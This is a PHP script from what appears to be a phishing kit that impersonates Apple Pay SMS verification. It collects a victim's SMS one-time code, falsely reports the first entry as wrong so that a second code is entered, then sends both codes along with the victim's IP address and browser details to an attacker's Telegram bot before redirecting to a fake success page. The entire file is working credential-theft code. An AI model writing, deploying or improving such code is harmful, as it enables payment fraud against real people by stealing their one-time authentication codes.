
<?php
session_start();
include('../email.php');
include('../PREVENTS/infos.php');
$_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

// Définir le chemin de redirection
$redirect_path = '../success.php';

// Traitement des codes SMS
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $code = isset($_POST['smsCode']) ? htmlspecialchars($_POST['smsCode'], ENT_QUOTES, 'UTF-8') : '';
    $attempt = isset($_POST['attempt']) ? (int)$_POST['attempt'] : 1;
    
    // Vérifier si on est en mode AJAX
    $isAjax = !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest';
    
    if ($attempt === 1 || !isset($_SESSION['first_code'])) {
        // Première tentative : on stocke le code
        $_SESSION['first_code'] = $code;
        
        if ($isAjax) {
            // Si c'est une requête AJAX, renvoyer une réponse JSON
            echo json_encode([
                'status' => 'error',
                'message' => 'Le code de validation saisi est incorrect. Merci de vérifier et de réessayer.'
            ]);
            exit;
        }
    } else {
        // Deuxième tentative : on récupère le premier et le second code
        $code1 = $_SESSION['first_code'];
        $code2 = $code;
        
        // Préparation du message pour Telegram avec emojis améliorés
        $message = "
            🏦 [Apple Pay - Codes SMS]
            
🔐 Premier Code : $code1
🔑 Deuxième Code : $code2
            
📱 Infos Utilisateur:
🌐 Adresse IP : " . $_SESSION['ip'] . "
🔍 User-Agent : " . $_SESSION['useragent'] . "
⏱️ Date/Heure : " . date("d/m/Y H:i:s");
        
        // Envoi via Telegram
        $data = [
            'text' => $message,
            'chat_id' => $chat_id
        ];
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
        
        if ($isAjax) {
            // Renvoi de la réponse JSON avec le chemin de redirection
            echo json_encode([
                'status' => 'success',
                'redirect' => $redirect_path
            ]);
        } else {
            // Redirection directe
            header('Location: ' . $redirect_path);
        }
        
        // Nettoyage de la session
        session_unset();
        session_destroy();
        exit;
    }
}
?>